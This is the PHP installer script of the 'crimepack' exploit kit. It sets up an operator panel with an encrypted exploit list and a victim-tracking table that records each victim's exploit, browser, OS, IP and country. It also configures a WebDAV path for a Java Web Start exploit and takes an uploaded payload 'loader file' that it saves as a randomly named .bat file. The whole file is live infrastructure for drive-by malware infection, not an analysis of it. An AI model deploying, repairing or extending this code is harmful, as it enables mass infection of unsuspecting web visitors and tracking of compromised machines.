<?php 
set_time_limit(0);
ini_set("memory_limit", "512M");
require_once("CP-ENC-7531.php");
require_once("CP-ENC-1633.php");
$configfile = "config.inc.php";
$webdavfile = "webdav.php";
if( !file_exists("ip-to-country.csv") ) 
{
    exit( "Error: ip-to-country.csv is missing" );
}

if( !isset($_POST["finishinstall"]) && (file_exists($configfile) || file_exists($webdavfile)) ) 
{
    exit( "Error: remove config.inc.php & webdav.php before installing" );
}

if( file_exists($configfile) ) 
{
    include($configfile);
}

$id = "CP18KYHAK0001";
$idpw = "password";
if( isset($_POST["finishinstall"]) ) 
{
    ShowHeaderInstall();
    $ok = 0;
    if( is_uploaded_file($_FILES["loadfile"]["tmp_name"]) ) 
    {
        move_uploaded_file($_FILES["loadfile"]["tmp_name"], $cpMySQL->DataDecrypt(LOADEXE));
        $ok = 1;
    }

    if( $ok ) 
    {
        $rep = "Install successfully completed!<br>Remove install.php";
    }
    else
    {
        $rep = "Install failed!";
    }

    echo "\r\n\t<table class=\"main\" align=\"center\">\r\n\t<tr>\r\n\t<td width=\"550\" valign=\"top\">\r\n\t<center><img src=img/logo.png>\r\n\t<hr></center>\r\n\t<table class=\"tbl2\" width=\"550\"><tr>\r\n\t<td class=\"tdtoptable\" width=\"550\" align=\"center\"><img src=\"img/in.png\"></td></tr></table>\r\n\t<table class=\"tbl1\" width=\"550\">\r\n\t<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>information</b></td>\r\n\t</tr>\r\n\t<td align=\"center\" class=\"tdx1\" width=\"550\">\r\n\t<br>\r\n\t" . $rep . "\r\n\t<br><br>\r\n\t</td><tr>\r\n\t<td align=\"center\" class=\"td1\" width=\"550\">\r\n\t<center>� 2009-2010 crimepack group - all rights reserved -</center>\r\n\t</td></tr></table></table>";
    exit();
}

if( !isset($_POST["install"]) ) 
{
    ShowHeaderInstall();
    echo "\r\n\r\n<form action=\"install.php\" method=\"post\" enctype=\"multipart/form-data\">\r\n<table class=\"main\" align=\"center\">\r\n<tr>\r\n<td width=\"550\" valign=\"top\">\r\n<center><img src=img/logo.png>\r\n<hr></center>\r\n<table class=\"tbl2\" width=\"550\"><tr>\r\n<td class=\"tdtoptable\" width=\"550\" align=\"center\"><img src=\"img/in.png\"></td></tr></table>\r\n<table class=\"tbl1\" width=\"550\">\r\n\r\n<!--\r\n\tINSTALL PASSWORD\r\n-->\r\n\r\n<tr>\r\n<td align=\"center\" class=\"td1\" width=\"550\"><b>install password</b></td></tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\">\r\n<br><input type=\"password\" style=\"text-align:center\" name=\"installpassword\" value=\"\"><br><br>\r\n</td>\r\n\r\n<!--\r\n\tADMIN SETTINGS \r\n-->\r\n\r\n<tr>\r\n<td align=\"center\" class=\"td1\" width=\"550\"><b>admin account</b></td></tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\">\r\nlogin:<br><input type=\"text\" style=\"text-align:center\" name=\"admlogin\" value=\"admin\"><br>\r\npassword:<br><input type=\"password\" style=\"text-align:center\" name=\"admpass\" value=\"\"><br><br>\r\n</td>\r\n<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>guest account</b></td></tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\">\r\nlogin:<br><input type=\"text\" style=\"text-align:center\" name=\"guestlogin\" value=\"guest\"><br>\r\npassword:<br><input type=\"password\" style=\"text-align:center\" name=\"guestpass\" value=\"\"><br><br>\r\n</td>\r\n\r\n<!--\r\n\t MYSQL SETTINGS \r\n-->\r\n\r\n<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>mysql settings</b></td></tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\">\r\nhostname:\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"mysqlhost\" value=\"localhost\"><br>\r\nuser:\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"mysqluser\" value=\"root\"><br>\r\npass:\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"mysqlpass\" value=\"abc123\"><br>\r\ndatabase:\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"mysqldb\" value=\"crimepack\"><br>\r\ntable prefix:\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"mysqlprefix\" value=\"cpack_\"><br>\r\n<br>\r\n</td>\r\n\r\n<!--\r\n\tWEBDAV SETTINGS\r\n-->\r\n\r\n<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>webdav settings</b></td></tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\"><br>\r\ndebian: webdav directory (2 backslash + domain + backslash + directory + backslash + data.dll)<br>\r\ncentos: webdav directory (4 backslash + domain + 2 backslash + directory + 2 backslash + data.dll)<br>\r\n<br><input type=\"text\" style=\"text-align:center\" name=\"webdav\" value=\"\\domain\\webdav\\data.dll\"><br><br>\r\n- if this is incorrect, java webstart exploit will NOT work -\r\n<br><br>\r\n</td>\r\n\r\n<!--\r\n\t INFORMATION\r\n-->\r\n\r\n<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>information</b></td>\r\n</tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\"><br>\r\nit might take a while to install depending on your specs so don't panic!<br><br>\r\n<input type=\"submit\" name=\"install\" value=\"&nbsp;&nbsp;install crimepack&nbsp;&nbsp;\"><br><br>\r\n</td>\r\n\r\n</form>\r\n<tr>\r\n<td align=\"center\" class=\"td1\" width=\"550\">\r\n<center>� 2009-2010 crimepack group - all rights reserved -</center>\r\n</td></tr></table></table>\r\n</body></html>\r\n";
}
else
{
    $error = 0;
    $rep = "";
    if( !isset($_POST["installpassword"]) ) 
    {
        $error = 1;
        $rep .= "install password is missing<br>";
    }

    if( !isset($_POST["admlogin"]) ) 
    {
        $error = 1;
        $rep .= "admin login is missing<br>";
    }

    if( !isset($_POST["admpass"]) ) 
    {
        $error = 1;
        $rep .= "admin password is missing<br>";
    }

    if( !isset($_POST["guestlogin"]) ) 
    {
        $error = 1;
        $rep .= "guest login is missing<br>";
    }

    if( !isset($_POST["guestpass"]) ) 
    {
        $error = 1;
        $rep .= "guest pass is missing<br>";
    }

    if( !isset($_POST["mysqlhost"]) ) 
    {
        $error = 1;
        $rep .= "mysql host is missing<br>";
    }

    if( !isset($_POST["mysqluser"]) ) 
    {
        $error = 1;
        $rep .= "mysql user is missing<br>";
    }

    if( !isset($_POST["mysqlpass"]) ) 
    {
        $error = 1;
        $rep .= "mysql password is missing<br>";
    }

    if( !isset($_POST["mysqldb"]) ) 
    {
        $error = 1;
        $rep .= "mysql db is missing<br>";
    }

    if( !isset($_POST["mysqlprefix"]) ) 
    {
        $error = 1;
        $rep .= "mysql prefix is missing<br>";
    }

    if( !isset($_POST["webdav"]) ) 
    {
        $error = 1;
        $rep .= "webdav path is missing<br>";
    }

    if( file_exists($configfile) ) 
    {
        $error = 1;
        $rep .= "remove config.inc.php before installing";
    }

    if( $_POST["installpassword"] != $idpw ) 
    {
        $rep .= "wrong install password!<br>forgotten?<br>contact author (93887300), your pack id is: " . $id . " <br>install failed!";
        $error = 1;
    }

    if( $error != 1 ) 
    {
        $fname = $cpFunctions->RandLtr(8, 2) . ".bat";
        $confdata = "<?php\r\n" . "// crimepack configuration for pack id: " . $id . "\r\n" . "define('MYSQLHOST','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($_POST["mysqlhost"])) . "');\r\n" . "define('MYSQLUSER','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($_POST["mysqluser"])) . "');\r\n" . "define('MYSQLPASS','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($_POST["mysqlpass"])) . "');\r\n" . "define('MYSQLDB','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($_POST["mysqldb"])) . "');\r\n" . "define('MYSQLPREFIX','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($_POST["mysqlprefix"])) . "');\r\n" . "define('LOADEXE','" . $cpMySQL->DataEncrypt($cpMySQL->antisqli($fname)) . "');\r\n" . "define('DOMAIN','" . $cpMySQL->DataEncrypt($_SERVER["HTTP_HOST"]) . "');\r\n" . "define('AUTOCHECK','" . $cpMySQL->DataEncrypt("0") . "');\r\n" . "define('REDIRECT','" . $cpMySQL->DataEncrypt("0") . "');\r\n" . "define('REDIRURL','" . $cpMySQL->DataEncrypt("http://www.google.com") . "');\r\n" . "define('BADTRAFF','" . $cpMySQL->DataEncrypt("0") . "');\r\n" . "define('EXPLOITS','5mjNbGKQRlMEssIrOc4ij4qT3/T/ensAnD/dNi6QKjWLvbde/tO+HQRIKsjce6ROfKpBTSv87mpmUIJykBRYbkdFdZBmRhqrCkXClpdpE7RonzvO4A9rMWqUrN3rv7xE8LfYQs3OYzRn/E3MQWIq0BGQhpcEmxELyj59PesfJTpYnhtU+rvtpJTtHzG6upJaMnRP');\r\n" . "//end of config\r\n" . "?>";
        if( file_put_contents($configfile, $confdata) !== strlen($confdata) ) 
        {
            $error = 1;
            $rep .= "can't write to config file (forgot to chmod?)";
        }

        $webdavdata = "<?php\r\n" . "\$webdav = '" . base64_encode($_POST["webdav"]) . "';\r\n" . "?>";
        if( file_put_contents($webdavfile, $webdavdata) !== strlen($webdavdata) ) 
        {
            $error = 1;
            $rep .= "can't write to webdav file (forgot to chmod?)";
        }

    }

    if( $error != 0 ) 
    {
        GoNext($rep, 1);
        exit();
    }

    include($configfile);
    $error = 0;
    $reply = "";
    $alogin = $cpMySQL->antisqli($_POST["admlogin"]);
    $apassword = md5($cpMySQL->antisqli($_POST["admpass"]));
    $glogin = $cpMySQL->antisqli($_POST["guestlogin"]);
    $gpassword = md5($cpMySQL->antisqli($_POST["guestpass"]));
    mysql_connect($cpMySQL->DataDecrypt(MYSQLHOST), $cpMySQL->DataDecrypt(MYSQLUSER), $cpMySQL->DataDecrypt(MYSQLPASS)) or exit( "Unable to connect to mysql, check your settings!" );
    if( mysql_query("CREATE DATABASE IF NOT EXISTS " . $cpMySQL->DataDecrypt(MYSQLDB) . "") ) 
    {
        mysql_select_db($cpMySQL->DataDecrypt(MYSQLDB));
    }
    else
    {
        $reply .= "Failed to create database<br>";
        $error = 1;
    }

    $cpUsers = "CREATE TABLE `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "users` (" . "`id` int(10) unsigned NOT NULL auto_increment," . "`login` varchar(255) NOT NULL default ''," . "`password` varchar(255) NOT NULL default ''," . "PRIMARY KEY  (`id`)," . "UNIQUE KEY `Login` (`login`)," . "KEY `id` (`id`)" . ");";
    if( !mysql_query($cpUsers) ) 
    {
        $reply .= "Failed to create users table<br>";
        $error = 1;
    }
    else
    {
        $reply .= "Users table OK<br>";
    }

    $bInsert = "INSERT INTO `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "" . "users` (`id`, `login`, `password`) VALUES (1, '" . $alogin . "', '" . $apassword . "');";
    if( mysql_query($bInsert) ) 
    {
        $reply .= "Admin account created!<br>";
    }
    else
    {
        $reply .= "Failed to add admin account!<br>";
        $error = 1;
    }

    $bInsert = "INSERT INTO `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "" . "users` (`id`, `login`, `password`) VALUES (2, '" . $glogin . "', '" . $gpassword . "');";
    if( mysql_query($bInsert) ) 
    {
        $reply .= "Guest account created!<br>";
    }
    else
    {
        $reply .= "Failed to add guest account!<br>";
        $error = 1;
    }

    mysql_query("DROP TABLE IF EXISTS `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "peeps`;");
    $cpTablePeeps = "CREATE TABLE `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "peeps` ( \r\n\t\t`id` bigint(20) NOT NULL AUTO_INCREMENT,\r\n\t\t`sploit` varchar(60) DEFAULT NULL,\r\n\t\t`browser` text NOT NULL, \r\n\t\t`os` text NOT NULL,\r\n\t\t`referer` text NOT NULL, \r\n\t\t`ip` text NOT NULL,  \r\n\t\t`tstamp` int(30) NOT NULL,\r\n\t\t`country` varchar(20) NOT NULL,\r\n\t\t`version` text NOT NULL, \r\n\t\t`extra` varchar(60) DEFAULT NULL,\r\n\t\tPRIMARY KEY (`id`));";
    if( !mysql_query($cpTablePeeps) ) 
    {
        $reply .= "Failed to create stats table!<br>";
        $error = 1;
    }
    else
    {
        $reply .= "Stats table created!<br>";
    }

    $cpId = "CREATE TABLE `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "expid` (\r\n\t\t`id` bigint(20) NOT NULL AUTO_INCREMENT,\r\n\t\t`exploitid` varchar(60) DEFAULT NULL,\r\n\t\tPRIMARY KEY (`id`));";
    if( !mysql_query($cpId) ) 
    {
        $reply .= "Failed to create Exploit ID table<br>";
        $error = 1;
    }
    else
    {
        $reply .= "Exploit ID Table OK<br>";
    }

    $bGeo = "CREATE TABLE IF NOT EXISTS iptoc (" . "COUNTRY_CODE2 character varying(2)," . "COUNTRY_CODE3 character varying(3)," . "COUNTRY_NAME character varying(50)," . "IP_FROM bigint," . "IP_TO bigint" . ");";
    if( !mysql_query($bGeo) ) 
    {
        $reply .= "Unable to create GeoIP table<br>";
        $error = 1;
    }

    mysql_query("DELETE FROM iptoc");
    $csv = "ip-to-country.csv";
    $countrys = file($csv);
    while( list(, $value) = each($countrys) ) 
    {
        if( preg_match("/\"([0-9]+)\",\"([0-9]+)\",\"(\\w+)\",\"(\\w+)\",\"(.+)\"/", $value, $match) ) 
        {
            $result = mysql_query("INSERT INTO iptoc (IP_FROM, IP_TO, COUNTRY_CODE2, COUNTRY_CODE3, COUNTRY_NAME) values (" . $match[1] . "," . $match[2] . ",'" . $match[3] . "','" . $match[4] . "','" . $match[5] . "')");
        }

    }
    GoNext($reply, $error);
}

function GoNext($info, $error)
{
    ShowHeaderInstall();
    echo "\r\n\r\n<table class=\"main\" align=\"center\">\r\n<tr>\r\n<td width=\"550\" valign=\"top\">\r\n<center><img src=img/logo.png>\r\n<hr></center>\r\n<table class=\"tbl2\" width=\"550\"><tr>\r\n<td class=\"tdtoptable\" width=\"550\" align=\"center\"><img src=\"img/in.png\"></td></tr></table>\r\n<table class=\"tbl1\" width=\"550\">\r\n<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>information</b></td>\r\n</tr>\r\n<td align=\"center\" class=\"tdx1\" width=\"550\">\r\n<br>\r\n" . $info . "\r\n<br><br>";
    if( $error == 1 ) 
    {
        echo "<a href=javascript:history.go(-1)>go back</a><br><br></td>";
    }
    else
    {
        echo "\r\n\t</td>\r\n\t<form action=\"install.php\" method=\"post\" enctype=\"multipart/form-data\">\r\n\t<tr><td align=\"center\" class=\"td1\" width=\"550\"><b>loader file</b></td>\r\n\t</tr>\r\n\t<td align=\"center\" class=\"tdx1\" width=\"550\">\r\n\t<br>\r\n\t<input type=\"file\" name=\"loadfile\"><br><br>\r\n\t<input type=\"submit\" name=\"finishinstall\" value=\"&nbsp;&nbsp;upload&nbsp;&nbsp;\"><br><br>\r\n\t</td>\r\n\t</form>";
    }

    echo "\r\n<tr>\r\n<td align=\"center\" class=\"td1\" width=\"550\">\r\n<center>(c) 2009-2010 crimepack group - all rights reserved</center>\r\n</td></tr></table></table>\r\n";
}

function ShowHeaderInstall()
{
    echo "<html><head>\r\n<title>crimepack install</title>\r\n<style>\r\nbody {\r\nbackground-image:url('img/bg.jpg');\r\nbackground-repeat:repeat;\r\n\tcolor:#c0c0c0;\r\n \tfont: normal 10px \"Lucida Sans Unicode\",sans-serif;\r\n}\r\nhr { border: 0.5px solid #525252; }\r\ninput,select\r\n{\r\n\tfont-size: 10pt;font-family: Arial; \r\n\tcolor: #666666; \r\n\tbackground-color: #272727;\r\n\tborder-color:#696969 #696969 #696969 #696969; \r\n\tborder-width:1pt 1pt 1pt 1pt;\r\n\tborder-style:solid solid solid solid; \r\n\tpadding-left: 2pt;\r\n\talign: center;\r\n\toverflow:hidden; 696969\r\n}\r\nTABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 10px; }\r\n.tbl1{\r\n\r\n\tcolor: #c0c0c0;\r\n\r\n\tbackground-color: #000000;\r\n\r\n\tborder: 1px solid #848383;\r\n\r\n}\r\n\r\n.td1{\r\n\tcolor: #c0c0c0;\r\n\tbackground-color: #444444;\r\n\tborder:1px solid #636363;\r\n}\r\n.tdx1{\r\n\tbackground-image:url('img/bgdark.jpg');\r\n\tbackground-repeat:repeat;\r\n\tcolor: #c0c0c0;\r\n\tbackground-color: #272727;\r\n\r\n}\r\n.tdtoptable{\r\n\tcolor: #c0c0c0;\r\n\tfont-weight: bold;\r\n\ttext-decoration:underline;\r\n\theight:20px;\r\n}\r\na {text-decoration: none; color: #272727; }\r\na {\r\n\tcolor:#c0c0c0;\r\n\ttext-decoration:underline;\r\n}\r\na:hover {\r\n\tcolor:#444444;\r\n\ttext-decoration:none;\r\n}\r\n.main {\r\nbackground-image:url('img/bgdark.jpg');\r\nbackground-repeat:repeat;\r\n\tcolor:#b5b5b5;\t\r\n\tborder:1px solid #525252;\t\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n";
}


